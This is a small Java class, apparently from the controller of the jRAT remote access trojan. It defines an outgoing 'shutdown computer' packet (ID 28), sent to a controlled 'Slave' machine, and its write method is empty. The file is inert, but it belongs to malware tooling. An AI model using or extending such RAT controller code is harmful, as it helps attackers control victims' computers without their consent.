package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet28ShutdownComputer extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 28;
	}

}
